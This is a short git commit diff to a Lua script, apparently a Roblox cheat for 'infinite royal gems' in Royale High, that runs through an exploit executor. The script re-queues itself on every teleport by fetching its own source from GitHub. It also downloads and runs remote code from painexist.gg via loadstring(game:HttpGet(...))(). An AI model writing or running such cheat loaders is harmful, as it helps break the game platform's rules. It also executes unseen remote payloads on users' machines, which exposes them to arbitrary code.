90ce550694175997ccec09844e423c9c1f1a3d73
ImLvna <44179559+ImLvna@users.noreply.github.com>
2022-02-03 18:08:43 -0500

    add timers and preload loadstrings

--- infiniteRoyalGems.lua
+++ infiniteRoyalGems.lua
@@ -1,11 +1,13 @@
+print('start 10s')
+wait(10)
+print('10s up')
 game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
     if State == Enum.TeleportState.Started then
         if syn~=nil then 
-            syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))()")
+            syn.queue_on_teleport(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))
         else 
-            queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))()")
+            queue_on_teleport(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))
         end
     end
 end)
-wait(1)
 loadstring(game:HttpGet('https://painexist.gg/api/royalehigh.lua', true))()
